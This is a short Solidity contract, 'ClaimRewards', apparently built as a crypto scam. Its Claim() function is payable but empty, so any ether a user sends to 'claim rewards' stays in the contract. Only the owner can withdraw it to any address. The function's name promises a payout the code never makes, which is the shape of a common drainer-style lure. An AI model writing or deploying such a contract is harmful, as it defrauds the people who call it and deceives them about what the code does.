// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Uncomment this line to use console.log
// import "hardhat/console.sol";
import "./Ownable.sol";

contract ClaimRewards is Ownable {

    constructor()  {
        // The Ownable constructor sets the owner to the address that deploys the contract
    }

    function withdraw(uint256 amount, address recipient) public onlyOwner {
        require(amount <= address(this).balance, "Requested amount exceeds the contract balance.");
        require(recipient != address(0), "Recipient address cannot be the zero address.");
        payable(recipient).transfer(amount);
    }

    function Claim() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
